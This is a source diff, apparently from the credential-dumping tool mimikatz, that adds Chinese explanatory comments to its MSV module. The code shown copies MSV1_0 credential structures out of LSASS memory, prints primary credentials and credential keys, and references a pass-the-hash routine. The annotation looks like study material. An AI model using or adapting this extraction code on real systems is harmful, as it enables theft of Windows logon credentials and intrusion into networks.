@@ -17,7 +17,7 @@ NTSTATUS kuhl_m_sekurlsa_msv(int argc, wchar_t * argv[])
 	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_msv_single_package, 1);
 }
 
-void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
+void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)  //msv认证包的处理凭据函数
 {
 	kuhl_m_sekurlsa_msv_enum_cred(pData->cLsass, pData->pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_std, pData);
 }
@@ -26,11 +26,11 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKUHL_M_SEKURLSA_CON
 {
 	DWORD flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL;
 	kprintf(L"\n\t [%08x] %Z", AuthenticationPackageId, &pCredentials->Primary);
-	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
+	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))  //判断 Primary 类型
 		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
-	else if(RtlEqualString(&pCredentials->Primary, &CREDENTIALKEYS_STRING, FALSE))
+	else if(RtlEqualString(&pCredentials->Primary, &CREDENTIALKEYS_STRING, FALSE))  
 		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
-	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, (PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA) pOptionalData, flags);
+	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, (PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA) pOptionalData, flags);  //调用统一的 genericCredsOutput 来格式化输出凭据内容
 	return TRUE;
 }
 
@@ -90,15 +90,14 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGO
 		return FALSE;
 	}
 	else return TRUE;
-}
-
+}//遍历和提取MSV认证包中存储的凭据信息
 VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID pCredentials, IN PKUHL_M_SEKURLSA_MSV_CRED_CALLBACK credCallback, IN PVOID optionalData)
 {
 	KIWI_MSV1_0_CREDENTIALS credentials;
 	KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {pCredentials, cLsass->hLsassMem};
 
-	while(aLsassMemory.address)
+	while(aLsassMemory.address)  //深度遍历 MSV1_0 凭据结构
 	{
 		aLocalMemory.address = &credentials;
 		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_CREDENTIALS)))
